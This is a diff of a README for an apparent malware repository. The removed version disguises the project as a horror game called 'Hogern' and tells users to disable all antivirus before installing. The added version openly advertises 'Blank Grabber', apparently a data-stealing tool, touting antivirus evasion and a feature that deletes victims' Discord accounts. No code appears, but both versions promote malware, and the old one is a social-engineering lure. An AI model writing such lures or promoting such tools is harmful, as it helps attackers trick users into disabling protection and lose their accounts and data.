@@ -1,13 +1,10 @@
-# Hogern
-Hogern is a game I made using out of the box ideas for levels in the game.
+# Blank Grabber with a WAY better gui + added features
 
---YOU MUST DISABLE ANTI VIRUS--
-Hogern uses files that can close your game which anti viruses flag as malware.
-Hogern is a horror game meant to use your computer as a way to increase the experience.
+# 1. Anti Anti Virus
 
---HOW TO INSTALL--
+Anti Viruses are unable to detect download of the grabber
 
-1. Disable all anti viruses
-2. Download the Source Code
-3. Unzip File
-4. Launch Hogern!
+# 2. Discord deleter
+
+Deletes users discord.
+   
